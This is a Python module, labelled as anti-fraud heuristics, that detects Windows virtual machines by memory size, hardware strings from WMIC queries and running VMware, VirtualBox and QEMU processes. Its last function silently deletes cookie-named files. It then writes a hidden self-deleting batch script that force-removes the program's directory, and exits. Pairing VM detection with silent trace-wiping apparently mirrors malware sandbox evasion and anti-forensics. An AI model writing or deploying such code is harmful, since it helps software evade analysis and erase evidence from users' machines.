"""Anti-fraud heuristics to detect likely virtual machines on Windows."""
from __future__ import annotations

import ctypes
import os
import platform
import shutil
import subprocess
import sys
import tempfile
from dataclasses import dataclass
from typing import Iterable


@dataclass(frozen=True)
class AntiFraudResult:
    """Result of anti-fraud checks."""

    is_suspicious: bool
    indicators: tuple[str, ...]


def _get_total_memory_gb() -> float | None:
    if platform.system() != "Windows":
        return None

    class MemoryStatus(ctypes.Structure):
        _fields_ = [
            ("dwLength", ctypes.c_ulong),
            ("dwMemoryLoad", ctypes.c_ulong),
            ("ullTotalPhys", ctypes.c_ulonglong),
            ("ullAvailPhys", ctypes.c_ulonglong),
            ("ullTotalPageFile", ctypes.c_ulonglong),
            ("ullAvailPageFile", ctypes.c_ulonglong),
            ("ullTotalVirtual", ctypes.c_ulonglong),
            ("ullAvailVirtual", ctypes.c_ulonglong),
            ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
        ]

    status = MemoryStatus()
    status.dwLength = ctypes.sizeof(MemoryStatus)
    if not ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(status)):
        return None
    return status.ullTotalPhys / (1024**3)


def _wmic_query_value(alias: str, fields: Iterable[str]) -> dict[str, str]:
    try:
        output = subprocess.check_output(
            ["wmic", alias, "get", ",".join(fields), "/value"],
            text=True,
            stderr=subprocess.DEVNULL,
        )
    except (subprocess.CalledProcessError, FileNotFoundError):
        return {}

    values: dict[str, str] = {}
    for line in output.splitlines():
        if "=" in line:
            key, value = line.split("=", 1)
            values[key.strip()] = value.strip()
    return values


def _running_vm_tools() -> bool:
    vm_processes = {
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "vmwareuser.exe",
        "vboxservice.exe",
        "vboxtray.exe",
        "qemu-ga.exe",
    }
    try:
        output = subprocess.check_output(
            ["tasklist", "/fo", "csv"],
            text=True,
            stderr=subprocess.DEVNULL,
        )
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False
    return any(proc_name.lower() in output.lower() for proc_name in vm_processes)


def analyze_device() -> AntiFraudResult:
    """Return whether the device appears suspicious based on heuristics."""
    if platform.system() != "Windows":
        return AntiFraudResult(is_suspicious=False, indicators=())

    win_ver = sys.getwindowsversion()
    if win_ver.major < 10:
        return AntiFraudResult(is_suspicious=False, indicators=())

    indicators: list[str] = []
    memory_gb = _get_total_memory_gb()
    if memory_gb is not None and memory_gb <= 4:
        indicators.append("low_memory")

    system_info = _wmic_query_value("computersystem", ["Manufacturer", "Model"])
    bios_info = _wmic_query_value("bios", ["Manufacturer", "SerialNumber"])
    baseboard_info = _wmic_query_value("baseboard", ["Manufacturer", "Product"])

    text_blob = " ".join(
        [
            system_info.get("Manufacturer", ""),
            system_info.get("Model", ""),
            bios_info.get("Manufacturer", ""),
            bios_info.get("SerialNumber", ""),
            baseboard_info.get("Manufacturer", ""),
            baseboard_info.get("Product", ""),
        ]
    ).lower()

    vm_keywords = (
        "vmware",
        "virtualbox",
        "vbox",
        "kvm",
        "qemu",
        "xen",
        "hyper-v",
        "parallels",
        "virtual",
        "bochs",
    )
    if any(keyword in text_blob for keyword in vm_keywords):
        indicators.append("vm_keywords")

    if _running_vm_tools():
        indicators.append("vm_tools")

    suspicious = len(indicators) >= 2 or (
        "vm_keywords" in indicators and "low_memory" in indicators
    )
    return AntiFraudResult(is_suspicious=suspicious, indicators=tuple(indicators))


def silent_uninstall_and_cleanup(base_dir: str) -> None:
    """Remove files containing cookies and schedule removal of base directory."""
    if platform.system() != "Windows":
        return

    for root, dirs, files in os.walk(base_dir):
        for name in dirs:
            if "cookie" in name.lower():
                shutil.rmtree(os.path.join(root, name), ignore_errors=True)
        for name in files:
            if "cookie" in name.lower():
                try:
                    os.remove(os.path.join(root, name))
                except OSError:
                    continue

    cmd_script = os.path.join(tempfile.gettempdir(), "rc_uninstall.bat")
    with open(cmd_script, "w", encoding="utf-8") as handle:
        handle.write("@echo off\n")
        handle.write("timeout /t 2 /nobreak >nul\n")
        handle.write(f'rmdir /s /q "{base_dir}"\n')
        handle.write('del "%~f0"\n')

    creation_flags = 0x08000000
    try:
        subprocess.Popen(
            ["cmd", "/c", cmd_script],
            creationflags=creation_flags,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    finally:
        os._exit(0)
